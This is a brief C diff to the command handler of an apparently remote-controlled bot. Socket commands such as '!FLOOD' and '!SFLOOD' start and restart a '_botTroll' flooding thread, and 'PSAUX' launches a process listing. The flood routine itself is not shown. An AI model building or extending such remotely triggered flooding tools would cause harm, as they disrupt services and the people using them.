@@ -596,20 +596,27 @@ else if(strstr(msg, "!ЛАМПОЧКА") != NULL && !LambsWork )
 else if(strstr(msg, "PSAUX") != NULL ) 
 {
  if(pthread_create(&_forCommands,NULL,&getProccess,socket) ==-1)error("No can create thread:(");
+ puts(".PSAUX.");
 }
 else if(strstr(msg, "QUIT") != NULL )
  QUIT(socket);
+
 else if(strstr(msg,"!FLOOD") != NULL)
  {
-  puts("...Init...");
+  pthread_cancel(ForTroll);
   NEEDFORFUCKOFF=10000;
   WAITMESSAGE=false;
   TIMETROLL=1;
+  if(pthread_create(&ForTroll,NULL, _botTroll, &socket) ==-1)error("No can create thread:(");
+  puts("...StartFlood...");
  }
 else if(strstr(msg,"!SFLOOD") != NULL)
 {
+  pthread_cancel(ForTroll);
   WAITMESSAGE=true;
   TIMETROLL=666;
+  if(pthread_create(&ForTroll,NULL, _botTroll, &socket) ==-1)error("No can create thread:(");
+  puts("...StopFlood...");
 }
 
 }
